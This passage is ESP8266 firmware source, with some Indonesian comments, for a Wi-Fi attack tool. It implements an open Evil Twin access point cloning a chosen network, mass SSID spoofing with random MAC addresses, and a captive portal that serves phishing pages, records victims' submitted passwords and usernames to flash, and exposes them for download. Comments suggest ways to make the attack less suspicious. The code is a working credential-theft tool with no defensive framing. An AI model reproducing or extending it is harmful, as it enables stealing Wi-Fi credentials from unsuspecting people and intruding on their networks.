void handleApiToggleHotspot() {
  if (_selectedNetwork.ssid != "") {
    // If hotspot is started, stop mass spoofing
    if (!hotspot_active && mass_spoofing_active) {
        mass_spoofing_active = false;
        // Revert to admin AP
        dnsServer.stop();
        WiFi.softAPdisconnect(true);
        delay(50);
        WiFi.softAPConfig(apIP, apIP, IPAddress(255, 255, 255, 0));
        WiFi.softAP(appSettings.adminApSsid.c_str(), appSettings.adminApPassword.c_str());
        dnsServer.start(DNS_PORT, "*", apIP);
        if (appSettings.enableDebugLogs) Serial.println("[INFO] Mass spoofing stopped due to Evil Twin activation.");
    }

    hotspot_active = !hotspot_active;
    
    // Always disconnect current softAP to ensure clean state before reconfiguring
    if (appSettings.enableDebugLogs) Serial.println("[INFO] Stopping current AP and DNS server for AP mode change...");
    dnsServer.stop(); // Stop DNS server first to prevent issues during AP change
    WiFi.softAPdisconnect(true); // Disconnect current AP completely
    delay(100); // Small delay for stability

    if (hotspot_active) {
      // Start Evil Twin AP with selected SSID (no password)
      WiFi.softAPConfig(apIP, apIP, IPAddress(255, 255, 255, 0));
      // IMPORTANT: Evil Twin AP should not have a password to capture credentials
      WiFi.softAP(_selectedNetwork.ssid.c_str()); 
      dnsServer.start(DNS_PORT, "*", apIP); // Restart DNS for Evil Twin
      if (appSettings.enableDebugLogs) Serial.println("[INFO] Evil Twin hotspot started for: " + _selectedNetwork.ssid);
    } else {
      // Restart admin AP with configured SSID and password
      WiFi.softAPConfig(apIP, apIP, IPAddress(255, 255, 255, 0));
      WiFi.softAP(appSettings.adminApSsid.c_str(), appSettings.adminApPassword.c_str()); // Restart admin AP using settings
      dnsServer.start(DNS_PORT, "*", apIP); // Restart DNS for admin AP
      if (appSettings.enableDebugLogs) Serial.println("[INFO] Evil Twin hotspot stopped. Admin AP restarted.");
    }
    webServer.send(200, "application/json", "{\"success\": true, \"hotspot_active\": " + String(hotspot_active ? "true" : "false") + "}");
  } else {
    if (appSettings.enableDebugLogs) Serial.println("[WARNING] Cannot toggle hotspot: No network selected.");
    webServer.send(400, "application/json", "{\"success\": false, \"message\": \"No target network selected\"}");
  }
}

void handleApiMassSpoofing() { // MODIFIED
  if (webServer.hasArg("plain")) {
    String body = webServer.arg("plain");
    DynamicJsonDocument doc(1024); // Adjust size based on expected SSID list length
    DeserializationError error = deserializeJson(doc, body);

    if (error) {
      webServer.send(400, "application/json", "{\"success\": false, \"message\": \"Invalid JSON\"}");
      return;
    }

    String ssidList = doc["ssid_list"].as<String>();
    appSettings.enableRandomMac = doc["random_mac"] | false; // NEW: Read random MAC setting
    appSettings.enableChannelHopping = doc["channel_hop"] | false; // NEW: Read channel hopping setting
    
    // Stop other attacks if mass spoofing is started
    if (hotspot_active) {
        hotspot_active = false;
        if (appSettings.enableDebugLogs) Serial.println("[SPOOF] Evil Twin deactivated for Mass Spoofing.");
    }
    if (deauthing_active) {
        deauthing_active = false;
        if (appSettings.enableDebugLogs) Serial.println("[SPOOF] Deauth attack deactivated for Mass Spoofing.");
    }
    
    // Parse SSIDs
    massSpoofingCount = 0;
    int lastIndex = 0;
    for (int i = 0; i < ssidList.length(); i++) {
      if (ssidList.charAt(i) == '\n') {
        String ssid = ssidList.substring(lastIndex, i);
        ssid.trim();
        if (ssid.length() > 0 && massSpoofingCount < 32) {
          massSpoofingSSIDs[massSpoofingCount++] = ssid;
        }
        lastIndex = i + 1;
      }
    }
    String lastSsid = ssidList.substring(lastIndex);
    lastSsid.trim();
    if (lastSsid.length() > 0 && massSpoofingCount < 32) {
      massSpoofingSSIDs[massSpoofingCount++] = lastSsid;
    }

    if (massSpoofingCount > 0) {
      mass_spoofing_active = true;
      currentSpoofingIndex = 0; // Start from the first SSID
      lastSpoofingChangeTime = millis(); // Reset timer
      
      // Immediately switch to the first SSID
      uint8_t* macToUse = spoofingMac;
      if (appSettings.enableRandomMac) {
          generateRandomMac(spoofingMac);
          macToUse = spoofingMac;
      }
      currentSpoofingChannel = appSettings.enableChannelHopping ? 1 : 1; // Start at channel 1 if hopping, else stay at 1
      startMassSpoofingAP(massSpoofingSSIDs[currentSpoofingIndex], currentSpoofingChannel, macToUse);

      if (appSettings.enableDebugLogs) Serial.println("[SPOOF] Mass SSID Spoofing started with " + String(massSpoofingCount) + " SSIDs. Current: " + massSpoofingSSIDs[currentSpoofingIndex] + " on Ch: " + String(currentSpoofingChannel) + " MAC: " + bytesToStr(macToUse, 6));
      webServer.send(200, "application/json", "{\"success\": true, \"message\": \"Mass spoofing started\", \"mass_spoofing_active\": true, \"current_spoofed_ssid\": \"" + massSpoofingSSIDs[currentSpoofingIndex] + "\"}");
    } else {
      mass_spoofing_active = false;
      webServer.send(400, "application/json", "{\"success\": false, \"message\": \"No valid SSIDs provided\", \"mass_spoofing_active\": false}");
    }
  } else {
    webServer.send(400, "application/json", "{\"success\": false, \"message\": \"No data provided\"}");
  }
}

void handleApiStopMassSpoofing() { // NEW
    mass_spoofing_active = false;
    massSpoofingCount = 0; // Clear SSID list
    currentSpoofingIndex = 0; // Reset index

    // Revert to admin AP
    dnsServer.stop();
    WiFi.softAPdisconnect(true);
    delay(100); // Small delay for stability
    WiFi.softAPConfig(apIP, apIP, IPAddress(255, 255, 255, 0));
    WiFi.softAP(appSettings.adminApSsid.c_str(), appSettings.adminApPassword.c_str());
    dnsServer.start(DNS_PORT, "*", apIP);

    if (appSettings.enableDebugLogs) Serial.println("[SPOOF] Mass SSID Spoofing stopped. Admin AP restarted.");
    webServer.send(200, "application/json", "{\"success\": true, \"message\": \"Mass spoofing stopped\", \"mass_spoofing_active\": false, \"current_spoofed_ssid\": \"N/A\"}");
}


void handleApiStatus() {
  DynamicJsonDocument doc(512); // Adjusted size
  doc["targetSsid"] = _selectedNetwork.ssid;
  doc["targetBssid"] = bytesToStr(_selectedNetwork.bssid, 6);
  doc["targetChannel"] = _selectedNetwork.ch;
  doc["hotspotActive"] = hotspot_active;
  doc["deauthActive"] = deauthing_active;
  doc["massSpoofingActive"] = mass_spoofing_active; // NEW
  doc["currentSpoofedSsid"] = (mass_spoofing_active && massSpoofingCount > 0) ? massSpoofingSSIDs[currentSpoofingIndex] : "N/A"; // NEW

  // Count captured passwords (simple line count)
  int passwordCount = 0;
  if (_capturedPasswordsLog.length() > 0) {
    for (int i = 0; i < _capturedPasswordsLog.length(); i++) {
      if (_capturedPasswordsLog.charAt(i) == '\n') {
        passwordCount++;
      }
    }
  }
  doc["passwordCount"] = passwordCount;

  doc["ipAddress"] = WiFi.softAPIP().toString();
  doc["macAddress"] = WiFi.softAPmacAddress();
  
  unsigned long seconds = (millis() - startTime) / 1000;
  unsigned long minutes = seconds / 60;
  unsigned long hours = minutes / 60;
  seconds %= 60;
  minutes %= 60;
  char uptimeBuffer[32]; // Use char array for uptime string
  snprintf(uptimeBuffer, sizeof(uptimeBuffer), "%luh:%02lum:%02lus", hours, minutes, seconds);
  doc["uptime"] = uptimeBuffer;

  doc["freeHeap"] = ESP.getFreeHeap();
  const size_t TOTAL_HEAP_ESTIMATE = 80 * 1024; // 80KB, adjust as needed for your board
  doc["totalHeap"] = TOTAL_HEAP_ESTIMATE;
  doc["memoryUsagePercent"] = (100.0 * (TOTAL_HEAP_ESTIMATE - ESP.getFreeHeap())) / TOTAL_HEAP_ESTIMATE;

  String jsonResponse;
  serializeJson(doc, jsonResponse);
  webServer.send(200, "application/json", jsonResponse);
}

void handleApiLogs() {
  DynamicJsonDocument doc(4096); // Keep large for potentially long logs
  doc["passwords"] = _capturedPasswordsLog;
  String jsonResponse;
  serializeJson(doc, jsonResponse);
  webServer.send(200, "application/json", jsonResponse);
}

void handleApiClearLogs() {
  _capturedPasswordsLog = "";
  saveCapturedPasswords(); // <--- TAMBAHAN BARU: Clear file as well
  if (appSettings.enableDebugLogs) Serial.println("[INFO] Password logs cleared.");
  webServer.send(200, "application/json", "{\"success\": true, \"message\": \"Logs cleared\"}");
}

void handleApiDownloadLogs() {
  webServer.sendHeader("Content-Disposition", "attachment; filename=password_log.txt");
  webServer.send(200, "text/plain", _capturedPasswordsLog);
}

void handleApiFiles() {
  DynamicJsonDocument doc(2048); // Adjusted size for file list
  JsonArray filesArray = doc.to<JsonArray>();

  Dir dir = SPIFFS.openDir("/");
  while (dir.next()) {
    String fileName = dir.fileName();
    size_t fileSize = dir.fileSize();
    JsonObject fileObj = filesArray.createNestedObject();
    fileObj["name"] = fileName;
    fileObj["size"] = fileSize;
    // Determine file type based on extension
    if (fileName.endsWith(".html")) fileObj["type"] = "html";
    else if (fileName.endsWith(".css")) fileObj["type"] = "css";
    else if (fileName.endsWith(".js")) fileObj["type"] = "javascript";
    else if (fileName.endsWith(".json")) fileObj["type"] = "json";
    else if (fileName.endsWith(".log")) fileObj["type"] = "log";
    else if (fileName.endsWith(".txt")) fileObj["type"] = "text";
    else fileObj["type"] = "unknown";
  }

  String jsonResponse;
  serializeJson(doc, jsonResponse);
  webServer.send(200, "application/json", jsonResponse);
}

void handleApiDeselectNetwork() { // <--- IMPLEMENTASI BARU
  _selectedNetwork = {"", 0, {0, 0, 0, 0, 0, 0}, 0, ""}; // Reset selected network
  deauthing_active = false; // Stop deauth if active
  hotspot_active = false;   // Stop hotspot if active
  mass_spoofing_active = false; // NEW: Stop mass spoofing if active
  massSpoofingCount = 0; // Clear SSID list
  currentSpoofingIndex = 0; // Reset index

  // Ensure admin AP is active and correct if Evil Twin or Mass Spoofing was running
  if (appSettings.enableDebugLogs) Serial.println("[INFO] Stopping current AP and DNS server for deselection...");
  dnsServer.stop();
  WiFi.softAPdisconnect(true);
  delay(100); // Small delay for stability
  WiFi.softAPConfig(apIP, apIP, IPAddress(255, 255, 255, 0));
  WiFi.softAP(appSettings.adminApSsid.c_str(), appSettings.adminApPassword.c_str());
  dnsServer.start(DNS_PORT, "*", apIP);

  if (appSettings.enableDebugLogs) Serial.println("[INFO] Network deselected. All attacks stopped. Admin AP restarted.");
  webServer.send(200, "application/json", "{\"success\": true, \"message\": \"Network deselected\"}");
}

// --- File Upload/Delete Handlers ---

void handleFileUpload() {
  HTTPUpload& upload = webServer.upload();
  if (upload.status == UPLOAD_FILE_START) {
    uploadErrorOccurred = false; // Reset flag <--- TAMBAHAN BARU
    String filename = upload.filename;
    if (!filename.startsWith("/")) filename = "/" + filename;
    if (appSettings.enableDebugLogs) Serial.print("[FILE] Uploading: "); Serial.println(filename);
    SPIFFS.remove(filename); // Remove existing file if it exists
    fsUploadFile = SPIFFS.open(filename, "w"); // Open the file in write mode
    if (!fsUploadFile) {
      if (appSettings.enableDebugLogs) Serial.println("[ERROR] Failed to open file for writing during upload: " + filename);
      uploadErrorOccurred = true; // Set error flag <--- TAMBAHAN BARU
      return; 
    }
  } else if (upload.status == UPLOAD_FILE_WRITE) {
    if (fsUploadFile && !uploadErrorOccurred) { // Check flag before writing <--- TAMBAHAN BARU
      fsUploadFile.write(upload.buf, upload.currentSize);
    } else if (!fsUploadFile && !uploadErrorOccurred) { // This case should ideally not happen if flag is set <--- TAMBAHAN BARU
      if (appSettings.enableDebugLogs) Serial.println("[ERROR] File not open for writing during upload (unexpected).");
      uploadErrorOccurred = true; // Set error flag <--- TAMBAHAN BARU
    }
  } else if (upload.status == UPLOAD_FILE_END) {
    if (fsUploadFile) {
      fsUploadFile.close(); // Close the file only at the end
      if (!uploadErrorOccurred) { // Only send success if no error occurred <--- TAMBAHAN BARU
        if (appSettings.enableDebugLogs) Serial.println("\n[FILE] Upload complete: " + upload.filename + ", size: " + String(upload.totalSize));
        webServer.send(200, "application/json", "{\"success\": true, \"message\": \"File uploaded successfully\"}");
      } else {
        if (appSettings.enableDebugLogs) Serial.println("[ERROR] Upload ended with prior error: " + upload.filename);
        webServer.send(500, "application/json", "{\"success\": false, \"message\": \"File write error during upload.\"}");
      }
    } else {
      if (appSettings.enableDebugLogs) Serial.println("[ERROR] File was not properly opened or written to (UPLOAD_FILE_END).");
      webServer.send(500, "application/json", "{\"success\": false, \"message\": \"File handle error at end of upload.\"}");
    }
  } else if (upload.status == UPLOAD_FILE_ABORTED) {
    if (fsUploadFile) {
      fsUploadFile.close();
      SPIFFS.remove(upload.filename); // Clean up aborted upload
      if (appSettings.enableDebugLogs) Serial.println("[FILE] Upload aborted: " + upload.filename);
    }
    webServer.send(500, "application/json", "{\"success\": false, \"message\": \"Upload aborted\"}");
  }
}

void handleFileDelete() {
  if (webServer.hasArg("plain")) { // Expecting JSON body with filename
    String body = webServer.arg("plain");
    DynamicJsonDocument doc(256); // Optimized size
    DeserializationError error = deserializeJson(doc, body);

    if (error) {
      webServer.send(400, "application/json", "{\"success\": false, \"message\": \"Invalid JSON\"}");
      return;
    }

    String filename = doc["filename"].as<String>();
    if (!filename.startsWith("/")) filename = "/" + filename;
    if (SPIFFS.exists(filename)) {
      SPIFFS.remove(filename);
      if (appSettings.enableDebugLogs) Serial.println("[FILE] Deleted: " + filename);
      webServer.send(200, "application/json", "{\"success\": true, \"message\": \"File deleted\"}");
    } else {
      if (appSettings.enableDebugLogs) Serial.println("[WARNING] File not found for deletion: " + filename);
      webServer.send(404, "application/json", "{\"success\": false, \"message\": \"File not found\"}");
    }
  } else {
    webServer.send(400, "application/json", "{\"success\": false, \"message\": \"No data provided\"}");
  }
}

// --- Captive Portal Handlers ---

void handleCaptivePortal() {
  if (!hotspot_active) {
    webServer.sendHeader("Location", "http://" + apIP.toString() + "/", true); // Redirect to main UI if Evil Twin not active
    webServer.send(302, "text/plain", "");
    return;
  }

  String captivePortalHTML = "";
  String templateToLoad = appSettings.defaultCaptivePortalTemplate; // Use setting

  // Prioritize custom uploaded template if it matches the setting
  if (templateToLoad == "custom" && SPIFFS.exists("/captive_portal_template.html")) {
      File file = SPIFFS.open("/captive_portal_template.html", "r");
      if (file) {
          captivePortalHTML = file.readString();
          file.close();
          if (appSettings.enableDebugLogs) Serial.println("[INFO] Serving custom captive portal from SPIFFS.");
      } else {
          if (appSettings.enableDebugLogs) Serial.println("[WARNING] Custom template not found in SPIFFS. Falling back to embedded default.");
          captivePortalHTML = CAPTIVE_PORTAL_TEMPLATE_HTML;
      }
  } else if (templateToLoad == "default") {
      captivePortalHTML = CAPTIVE_PORTAL_TEMPLATE_HTML;
      if (appSettings.enableDebugLogs) Serial.println("[INFO] Serving embedded default captive portal template.");
  }
  // Add more cases here for other built-in templates if they were stored as separate PROGMEM strings
  // e.g., if (templateToLoad == "facebook") captivePortalHTML = FACEBOOK_TEMPLATE_HTML;
  else {
      // Fallback if setting is invalid or template not found
      captivePortalHTML = CAPTIVE_PORTAL_TEMPLATE_HTML;
      if (appSettings.enableDebugLogs) Serial.println("[WARNING] Invalid default captive portal template setting or template not found. Serving embedded default.");
  }
  
  captivePortalHTML.replace("{SSID}", _selectedNetwork.ssid);
  captivePortalHTML.replace("{DEVICE_NAME}", APP_NAME);
  captivePortalHTML.replace("{CURRENT_TIME}", String(millis() / 1000) + "s"); // Simple uptime for time

  webServer.send(200, "text/html", captivePortalHTML);
}

void handleCaptivePortalSubmit() {
  if (webServer.hasArg("password")) {
    String capturedPassword = webServer.arg("password");
    String capturedUsername = webServer.hasArg("username") ? webServer.arg("username") : "N/A"; // For templates with username field

    // Basic validation: check password length
    if (capturedPassword.length() < 4) { // Example: require at least 4 characters
        if (appSettings.enableDebugLogs) Serial.println("[WARNING] Captured password too short, likely invalid.");
        // You might want to redirect to an error page or re-prompt
        String response = "<!DOCTYPE html><html><head><title>Error</title><meta name='viewport' content='width=device-width, initial-scale=1'></head><body>";
        response += "<center><h1>Error!</h1><p>Invalid password. Please try again.</p>";
        response += "<p><a href=\"/generate_captive_portal\">Go Back</a></p></center></body></html>";
        webServer.send(200, "text/html", response);
        return;
    }

    char logBuffer[256]; // Use char array for log entry to reduce String fragmentation
    snprintf(logBuffer, sizeof(logBuffer), "Captured for SSID: %s, User: %s, Pass: %s (Time: %lus)\n",
             _selectedNetwork.ssid.c_str(), capturedUsername.c_str(), capturedPassword.c_str(), millis() / 1000);
    
    _capturedPasswordsLog += logBuffer; // Append to String buffer
    saveCapturedPasswords(); // <--- TAMBAHAN BARU: Save passwords after capture

    if (appSettings.enableDebugLogs) {
      Serial.print("[SNIFFER] ");
      Serial.println(logBuffer);
    }

    // After capturing, you can redirect them to a "success" page or a fake error page
    // or even try to connect to the real AP (if you want to be less suspicious).
    // For now, a simple "Thank You" page.
    String response = "<!DOCTYPE html><html><head><title>Success</title><meta name='viewport' content='width=device-width, initial-scale=1'></head><body>";
    response += "<center><h1>Thank You!</h1><p>Your connection is being established. Please wait...</p>";
    response += "<p>You may need to reconnect to the network.</p></center></body></html>";
    webServer.send(200, "text/html", response);

    // Optional: Try to connect to the real AP with the captured password
    // This makes the attack more convincing but requires the ESP to switch roles.
    // WiFi.disconnect();
    // WiFi.begin(_selectedNetwork.ssid.c_str(), capturedPassword.c_str(), _selectedNetwork.ch, _selectedNetwork.bssid);
    // if (appSettings.enableDebugLogs) Serial.println("[INFO] Attempting to connect to real AP with captured password...");
  } else {
    webServer.send(200, "text/html", "Password not provided.");
  }
}

// --- System Control ---

void handleRestart() {
  webServer.send(200, "text/html", "<h1>Restarting Device...</h1><p>The device will restart in a few seconds. Please wait.</p>");
  delay(2000);
  ESP.restart();
}

// --- New: Settings Management Functions (Implementation) ---
const char SETTINGS_FILE[] = "/settings.json";

void loadSettings() {
  // Set default values first
  appSettings.adminApSsid = DEFAULT_ADMIN_AP_SSID; // Use original #define as default
  appSettings.adminApPassword = DEFAULT_ADMIN_AP_PASSWORD;
  appSettings.enableDebugLogs = false;
  appSettings.defaultCaptivePortalTemplate = "default";
  appSettings.enableRandomMac = false; // NEW default
  appSettings.enableChannelHopping = false; // NEW default

  if (SPIFFS.exists(SETTINGS_FILE)) {
    File settingsFile = SPIFFS.open(SETTINGS_FILE, "r");
    if (settingsFile) {
      DynamicJsonDocument doc(512); // Optimized size <--- OPTIMASI
      DeserializationError error = deserializeJson(doc, settingsFile);
      if (!error) {
        appSettings.adminApSsid = doc["adminApSsid"] | appSettings.adminApSsid;
        appSettings.adminApPassword = doc["adminApPassword"] | appSettings.adminApPassword;
        appSettings.enableDebugLogs = doc["enableDebugLogs"] | appSettings.enableDebugLogs;
        appSettings.defaultCaptivePortalTemplate = doc["defaultCaptivePortalTemplate"] | appSettings.defaultCaptivePortalTemplate;
        appSettings.enableRandomMac = doc["enableRandomMac"] | appSettings.enableRandomMac; // NEW
        appSettings.enableChannelHopping = doc["enableChannelHopping"] | appSettings.enableChannelHopping; // NEW
        if (appSettings.enableDebugLogs) Serial.println("[INFO] Settings loaded from SPIFFS.");
      } else {
        if (appSettings.enableDebugLogs) Serial.println("[ERROR] Failed to parse settings JSON. Using defaults.");
      }
      settingsFile.close();
    } else {
      if (appSettings.enableDebugLogs) Serial.println("[ERROR] Failed to open settings file for reading. Using defaults.");
    }
  } else {
    if (appSettings.enableDebugLogs) Serial.println("[INFO] Settings file not found. Using default settings.");
    saveSettings(); // Save defaults to file for next boot
  }
}

void saveSettings() {
  File settingsFile = SPIFFS.open(SETTINGS_FILE, "w");
  if (settingsFile) {
    DynamicJsonDocument doc(512); // Optimized size <--- OPTIMASI
    doc["adminApSsid"] = appSettings.adminApSsid;
    doc["adminApPassword"] = appSettings.adminApPassword;
    doc["enableDebugLogs"] = appSettings.enableDebugLogs;
    doc["defaultCaptivePortalTemplate"] = appSettings.defaultCaptivePortalTemplate;
    doc["enableRandomMac"] = appSettings.enableRandomMac; // NEW
    doc["enableChannelHopping"] = appSettings.enableChannelHopping; // NEW

    if (serializeJson(doc, settingsFile) == 0) {
      if (appSettings.enableDebugLogs) Serial.println("[ERROR] Failed to write settings to file.");
    } else {
      if (appSettings.enableDebugLogs) Serial.println("[INFO] Settings saved to SPIFFS.");
    }
    settingsFile.close();
  } else {
    if (appSettings.enableDebugLogs) Serial.println("[ERROR] Failed to open settings file for writing.");
  }
}

void handleApiGetSettings() {
  DynamicJsonDocument doc(512); // Optimized size <--- OPTIMASI
  doc["adminApSsid"] = appSettings.adminApSsid;
  doc["adminApPassword"] = appSettings.adminApPassword;
  doc["enableDebugLogs"] = appSettings.enableDebugLogs;
  doc["defaultCaptivePortalTemplate"] = appSettings.defaultCaptivePortalTemplate;
  doc["enableRandomMac"] = appSettings.enableRandomMac; // NEW
  doc["enableChannelHopping"] = appSettings.enableChannelHopping; // NEW

  String jsonResponse;
  serializeJson(doc, jsonResponse);
  webServer.send(200, "application/json", jsonResponse);
}

void handleApiSaveSettings() {
  if (webServer.hasArg("plain")) {
    String body = webServer.arg("plain");
    DynamicJsonDocument doc(512); // Optimized size <--- OPTIMASI
    DeserializationError error = deserializeJson(doc, body);

    if (error) {
      webServer.send(400, "application/json", "{\"success\": false, \"message\": \"Invalid JSON\"}");
      return;
    }

    // Update settings from JSON, using current values as defaults if not provided
    String newAdminApSsid = doc["adminApSsid"] | appSettings.adminApSsid;
    String newAdminApPassword = doc["adminApPassword"] | appSettings.adminApPassword;
    bool newEnableDebugLogs = doc["enableDebugLogs"] | appSettings.enableDebugLogs;
    String newDefaultCaptivePortalTemplate = doc["defaultCaptivePortalTemplate"] | appSettings.defaultCaptivePortalTemplate;
    bool newEnableRandomMac = doc["enableRandomMac"] | appSettings.enableRandomMac; // NEW
    bool newEnableChannelHopping = doc["enableChannelHopping"] | appSettings.enableChannelHopping; // NEW

    bool apSettingsChanged = (newAdminApSsid != appSettings.adminApSsid || newAdminApPassword != appSettings.adminApPassword);

    appSettings.adminApSsid = newAdminApSsid;
    appSettings.adminApPassword = newAdminApPassword;
    appSettings.enableDebugLogs = newEnableDebugLogs;
    appSettings.defaultCaptivePortalTemplate = newDefaultCaptivePortalTemplate;
    appSettings.enableRandomMac = newEnableRandomMac; // NEW
    appSettings.enableChannelHopping = newEnableChannelHopping; // NEW

    saveSettings(); // Save updated settings to SPIFFS

    // If admin AP settings changed, restart AP
    // Note: This will temporarily disconnect clients from the admin AP.
    // A full restart might be better for critical changes.
    if (apSettingsChanged) {
        if (appSettings.enableDebugLogs) Serial.println("[INFO] Admin AP settings changed. Restarting AP...");
        dnsServer.stop(); // Stop and restart DNS server
        WiFi.softAPdisconnect(true);
        delay(100); // Small delay for stability
        WiFi.softAPConfig(apIP, apIP, IPAddress(255, 255, 255, 0));
        WiFi.softAP(appSettings.adminApSsid.c_str(), appSettings.adminApPassword.c_str());
        dnsServer.start(DNS_PORT, "*", apIP);
    }

    webServer.send(200, "application/json", "{\"success\": true, \"message\": \"Settings saved successfully\"}");
  } else {
    webServer.send(400, "application/json", "{\"success\": false, \"message\": \"No data provided\"}");
  }
}

// --- New: Password Log Management Functions (Implementation) --- <--- TAMBAHAN BARU
void loadCapturedPasswords() {
  if (SPIFFS.exists(CAPTURED_PASSWORDS_FILE)) {
    File logFile = SPIFFS.open(CAPTURED_PASSWORDS_FILE, "r");
    if (logFile) {
      _capturedPasswordsLog = logFile.readString();
      logFile.close();
      if (appSettings.enableDebugLogs) Serial.println("[INFO] Loaded captured passwords from SPIFFS.");
    } else {
      if (appSettings.enableDebugLogs) Serial.println("[ERROR] Failed to open captured passwords file for reading.");
    }
  } else {
    if (appSettings.enableDebugLogs) Serial.println("[INFO] Captured passwords file not found. Starting fresh.");
  }
}

void saveCapturedPasswords() {
  File logFile = SPIFFS.open(CAPTURED_PASSWORDS_FILE, "w");
  if (logFile) {
    logFile.print(_capturedPasswordsLog);
    logFile.close();
    if (appSettings.enableDebugLogs) Serial.println("[INFO] Saved captured passwords to SPIFFS.");
  } else {
    if (appSettings.enableDebugLogs) Serial.println("[ERROR] Failed to open captured passwords file for writing.");
  }
}

// --- NEW: Mass Spoofing Helper Functions ---
void generateRandomMac(uint8_t* mac) {
  // Generate a random MAC address.
  // The first byte should have the 0x02 bit set for locally administered addresses,
  // and the 0x01 bit cleared for unicast.
  // Example: x2:xx:xx:xx:xx:xx
  mac[0] = (uint8_t)(random(256) & 0xFE) | 0x02; // Ensure locally administered, unicast
  mac[1] = (uint8_t)random(256);
  mac[2] = (uint8_t)random(256);
  mac[3] = (uint8_t)random(256);
  mac[4] = (uint8_t)random(256);
  mac[5] = (uint8_t)random(256);
}

void startMassSpoofingAP(String ssid, uint8_t channel, uint8_t* mac) {
    dnsServer.stop();
    WiFi.softAPdisconnect(true);
    delay(50); // Small delay for stability

    // Set custom MAC address for the soft AP
    // This requires including "user_interface.h" and using SDK functions
    // Note: This might not work perfectly on all ESP8266 core versions or might be overridden.
    // For true MAC spoofing in beacon frames, you'd need to craft raw 802.11 frames.
    // This sets the MAC of the ESP's AP interface.
    if (mac != nullptr) {
        if (appSettings.enableDebugLogs) Serial.println("[SPOOF] Setting AP MAC to: " + bytesToStr(mac, 6));
        // This function sets the MAC for the softAP interface.
        // It needs to be called *before* WiFi.softAP() for it to take effect.
        // It's part of the ESP8266 SDK, so it's available via user_interface.h
        // The first byte of the MAC should be even for unicast, and the second bit (0x02) should be set for locally administered.
        // For example, 0x02:XX:XX:XX:XX:XX
        // The current generateRandomMac already handles this.
        wifi_set_macaddr(SOFTAP_IF, mac);
    }

    WiFi.softAPConfig(apIP, apIP, IPAddress(255, 255, 255, 0));
    // Set channel for soft AP
    WiFi.softAP(ssid.c_str(), "", channel, false, 0); // SSID, password (none), channel, hidden, max_connection
    dnsServer.start(DNS_PORT, "*", apIP);
}


// --- NEW: OTA Update Handlers ---
void handleOTAUpdate() {
  HTTPUpload& upload = webServer.upload();
  if (upload.status == UPLOAD_FILE_START) {
    Serial.printf("[OTA] Update: %s\n", upload.filename.c_str());
    if (!Update.begin(UPDATE_SIZE_UNKNOWN)) { // Start with unknown size
      Update.printError(Serial);
    }
  } else if (upload.status == UPLOAD_FILE_WRITE) {
    if (Update.write(upload.buf, upload.currentSize) != upload.currentSize) {
      Update.printError(Serial);
    }
  } else if (upload.status == UPLOAD_FILE_END) {
    if (Update.end(true)) { // true to set the size to the current progress
      Serial.printf("[OTA] Update Success: %u bytes\n", upload.totalSize);
    } else {
      Update.printError(Serial);
    }
  } else if (upload.status == UPLOAD_FILE_ABORTED) {
    Update.abort();
    Serial.println("[OTA] Update aborted");
  }
  delay(0); // Yield to allow other tasks
}

void handleOTAStart() {
  if (appSettings.enableDebugLogs) Serial.println("[OTA] OTA update started!");
  // You might want to turn off Wi-Fi or other services here
  // For now, just logging
}

void handleOTAProgress(unsigned int progress, unsigned int total) {
  if (appSettings.enableDebugLogs) Serial.printf("[OTA] Progress: %u%%\n", (progress * 100) / total);
}

void handleOTAEnd() {
  if (appSettings.enableDebugLogs) Serial.println("[OTA] OTA update finished. Rebooting...");
}

void handleOTAErrors(ota_error_t error) {
  if (appSettings.enableDebugLogs) {
    Serial.print("[OTA] Error: ");
    if (error == OTA_AUTH_ERROR) Serial.println("Auth Failed");
    else if (error == OTA_BEGIN_ERROR) Serial.println("Begin Failed");
    else if (error == OTA_CONNECT_ERROR) Serial.println("Connect Failed");
    else if (error == OTA_RECEIVE_ERROR) Serial.println("Receive Failed");
    else if (error == OTA_END_ERROR) Serial.println("End Failed");
    else Serial.println("Unknown Error");
  }
}


// --- OLED Update Function Implementation ---
void updateOLEDDisplay() {
  display.clearDisplay();
  display.setTextSize(1);
  display.setTextColor(SSD1306_WHITE);

  display.setCursor(0, 0);
  display.println(APP_NAME);
  display.drawFastHLine(0, 9, SCREEN_WIDTH, SSD1306_WHITE); // Separator line

  display.setCursor(0, 12);
  display.print("AP: ");
  if (mass_spoofing_active && massSpoofingCount > 0) { // Show current spoofed SSID
      display.println(massSpoofingSSIDs[currentSpoofingIndex].substring(0, min((int)massSpoofingSSIDs[currentSpoofingIndex].length(), 16)));
  } else { // Show admin AP SSID
      display.println(appSettings.adminApSsid.substring(0, min((int)appSettings.adminApSsid.length(), 16))); // Truncate long SSID
  }

  display.setCursor(0, 22);
  display.print("IP: ");
  display.println(WiFi.softAPIP().toString());

  display.setCursor(0, 32);
  display.print("Target: ");
  if (_selectedNetwork.ssid != "") {
    display.println(_selectedNetwork.ssid.substring(0, min((int)_selectedNetwork.ssid.length(), 10)) + "..."); // Truncate long SSID
  } else {
    display.println("None");
  }

  display.setCursor(0, 42);
  display.print("Deauth: ");
  display.print(deauthing_active ? "ON" : "OFF");
  display.print(" Hotspot: ");
  display.println(hotspot_active ? "ON" : "OFF");

  display.setCursor(0, 52);
  display.print("Uptime: ");
  unsigned long seconds = (millis() - startTime) / 1000;
  unsigned long minutes = seconds / 60;
  unsigned long hours = minutes / 60;
  seconds %= 60;
  minutes %= 60;
  
  if (hours > 0) {
    display.print(hours);
    display.print("h ");
  }
  if (minutes > 0 || hours > 0) { // Show minutes if hours are shown or if minutes exist
    display.print(minutes);
    display.print("m ");
  }
  display.print(seconds);
  display.println("s");

  display.display();
}

